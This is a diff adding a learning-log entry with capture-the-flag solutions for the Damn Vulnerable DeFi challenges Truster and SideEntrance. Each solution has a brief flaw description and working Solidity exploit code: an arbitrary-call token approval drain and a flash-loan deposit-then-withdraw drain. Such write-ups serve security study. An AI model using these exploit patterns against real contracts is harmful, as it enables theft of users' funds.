@@ -95,4 +95,67 @@ Solve:
     }
 ```
 
+### 2024.08.30
+
+- Damn Vulnerable DeFi: Truster
+- Damn Vulnerable DeFi: SideEntrance
+
+#### Truster
+Issue:
+
+The issue for this flash loan contract is the usage of `functionCall`, which allows the attacker to perform function calls under the flash loan contract's context.
+
+Solve:
+```solidity=
+    function test_truster() public checkSolvedByPlayer {
+        test t = new test();
+
+        bytes memory approveData = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            player,
+            type(uint256).max
+        );
+        
+        pool.flashLoan(0, player, address(pool.token()), approveData);
+
+        pool.token().transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+
+    }
+```
+
+#### SideEntrance
+Issue: 
+
+The main idea for this program is to utilize the deposit function while using a flash loan, which will manipulate the balance and also fulfill the balance requirement to complete the flash loan.
+
+Solve:
+
+```solidity=
+function test_sideEntrance() public checkSolvedByPlayer {
+    Exploit exp = new Exploit(address(pool), recovery);
+    exp.attack(address(pool).balance);
+}
+
+contract Exploit{
+    SideEntranceLenderPool pool;
+
+    address recovery;
+    constructor(address _pool, address _recovery) {
+        pool = SideEntranceLenderPool(_pool);
+        recovery = _recovery;
+    }
+    function execute()public payable{
+        pool.deposit{value:address(this).balance}();
+    }
+    function attack(uint256 amount) public payable{
+        pool.flashLoan(amount);
+        pool.withdraw();
+        payable(recovery).transfer(address(this).balance);
+    }
+    receive () external payable {}
+
+}
+```
+
+
 <!-- Content_END -->
